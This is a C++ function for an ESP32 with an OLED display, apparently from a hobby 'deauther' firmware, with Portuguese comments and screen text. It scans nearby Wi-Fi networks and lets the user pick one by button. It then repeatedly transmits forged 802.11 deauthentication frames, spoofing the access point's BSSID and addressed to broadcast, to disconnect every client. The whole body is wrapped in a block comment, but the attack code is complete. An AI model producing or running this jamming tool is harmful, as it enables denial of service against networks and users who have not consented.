void Deauther() {/*
  WiFi.mode(WIFI_STA);
  esp_wifi_start();

  // 2. Variáveis de estado
  int selectedNetwork = 0;
  int networkCount = 0;
  bool attacking = false;
  unsigned long lastDebounce = 0;
  const int debounceDelay = 200;

  // 3. Scan inicial
  u8g2.clearBuffer();
  u8g2.setCursor(0, 30);
  u8g2.print("Scanneando redes...");
  u8g2.sendBuffer();
  
  WiFi.scanDelete();
  networkCount = WiFi.scanNetworks(false, true);
  
  // 4. Loop principal
  while(true) {
    // Verifica botão de saída
    if(digitalRead(BUTTON_PIN_UP) == LOW && millis() - lastDebounce > debounceDelay) {
      if(attacking) {
        attacking = false;
        u8g2.clearBuffer();
        u8g2.setCursor(0, 30);
        u8g2.print("Ataque cancelado!");
        u8g2.sendBuffer();
        delay(1000);
      } else {
        break;
      }
      lastDebounce = millis();
    }

    // Modo seleção de rede
    if(!attacking) {
      // Navegação
      if(digitalRead(BUTTON_PIN_DIR) == LOW && millis() - lastDebounce > debounceDelay) {
        selectedNetwork = (selectedNetwork + 1) % networkCount;
        lastDebounce = millis();
      }
      else if(digitalRead(BUTTON_PIN_ESQ) == LOW && millis() - lastDebounce > debounceDelay) {
        selectedNetwork = (selectedNetwork - 1 + networkCount) % networkCount;
        lastDebounce = millis();
      }

      // Exibe rede selecionada
      u8g2.clearBuffer();
      u8g2.setCursor(0, 10);
      u8g2.print("Selecione a rede:");
      u8g2.setCursor(0, 30);
      u8g2.print(WiFi.SSID(selectedNetwork));
      u8g2.setCursor(0, 50);
      u8g2.print("OK:DOWN  Volta:UP");
      u8g2.sendBuffer();

      // Inicia ataque
      if(digitalRead(BUTTON_PIN) == LOW && millis() - lastDebounce > debounceDelay) {
        attacking = true;
        lastDebounce = millis();
      }
    }
    // Modo ataque
    else {
      // Prepara pacote de deautenticação
      uint8_t deauthPacket[26] = {
        0xC0, 0x00, 0x00, 0x00,             // Type: Management, Subtype: Deauth
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (broadcast)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (substituir)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (substituir)
        0x00, 0x00,                         // Sequence number
        0x01, 0x00                          // Reason: Unspecified
      };

      // Configura com BSSID real
      memcpy(&deauthPacket[10], WiFi.BSSID(selectedNetwork), 6);
      memcpy(&deauthPacket[16], WiFi.BSSID(selectedNetwork), 6);

      // Feedback visual
      u8g2.clearBuffer();
      u8g2.setCursor(0, 10);
      u8g2.print("Atacando:");
      u8g2.setCursor(0, 30);
      u8g2.print(WiFi.SSID(selectedNetwork));
      u8g2.setCursor(0, 50);
      u8g2.print("UP p/ parar");
      u8g2.sendBuffer();

      // Envia pacote (10x para maior eficácia)
      for(int i = 0; i < 10; i++) {
        esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
        delay(50);
      }
    }

    delay(10);
  }

  // Finalização
  esp_wifi_stop();
  u8g2.clearBuffer();
  u8g2.setCursor(0, 30);
  u8g2.print("Operacao finalizada!");
  u8g2.sendBuffer();
  delay(1000);
*/}
